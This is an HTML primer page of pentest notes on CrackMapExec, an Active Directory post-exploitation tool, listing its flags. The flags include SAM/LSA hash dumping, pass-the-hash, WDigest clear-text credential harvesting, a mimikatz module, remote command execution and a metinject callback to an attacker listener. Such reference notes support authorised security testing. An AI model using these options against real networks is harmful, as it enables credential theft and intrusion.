<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body><b>CrackMapExec</b><br/>
CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.<br/>
<br/>
CME makes heavy use of the Impacket library (developed by @asolino) and the PowerSploit Toolkit (developed by @mattifestation) for working with network protocols and performing a variety of post-exploitation techniques.<br/>
<br/>
Although meant to be used primarily for offensive purposes (e.g. red teams), CME can be used by blue teams as well to assess account privileges, find possible misconfigurations and simulate attack scenarios.<br/>
<br/>
Some Flags:<br/>
CrackMapExec (CME)<br/>
--pass-pol&#09;&#09;&#09;&#09;&#09;&#09;&#09;check password policy before spraying everywhere<br/>
--shares&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;enumerate all shares<br/>
--lusers&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;see who's logged into a machine<br/>
--sessions&#09;&#09;&#09;&#09;&#09;&#09;&#09;enumerate active sessions<br/>
--loggedon-users&#09;&#09;&#09;&#09;&#09;&#09;enumerate logged on users<br/>
--users&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;enumerate domain users<br/>
--groups&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;enumerate domain groups<br/>
--local-auth&#09;&#09;&#09;&#09;&#09;&#09;&#09;authenticate locally<br/>
-x&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;executes commands via WMI<br/>
-X&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;executes PowerShell command<br/>
--obfs&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;obfuscate powershell scripts<br/>
--clear-obfscripts&#09;&#09;&#09;&#09;&#09;&#09;clear all cached obfuscated powershell scripts<br/>
--exec-method&#09;&#09;&#09;&#09;&#09;&#09;set exec method, ie: smbexec<br/>
--sam&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;dump SAM hashes<br/>
--lsa&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;dump LSA hashes<br/>
-H&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;Flag to pass the hash<br/>
--wdigest enable&#09;&#09;&#09;&#09;&#09;&#09;Enable the WDigest provider to dump clear-text creds<br/>
-m &lt;module&gt;<br/>
&nbsp;&#09;modules/credentials/mimikatz.py<br/>
-m &lt;module&gt; -o &lt;option&gt;&#09;&#09;&#09;&#09;options for modules<br/>
-m &lt;module&gt; --module-info&#09;&#09;&#09;&#09;module info<br/>
-M metinject -o LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt;&#09;catch with multi/handler<br/>
--spider&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;share to spider<br/>
--spider-folder&#09;&#09;&#09;&#09;&#09;&#09;&#09;folder to spider<br/>
--content&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;enable file content searching<br/>
--pattern&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;pattern to search for in folders, filenames, content</body></html>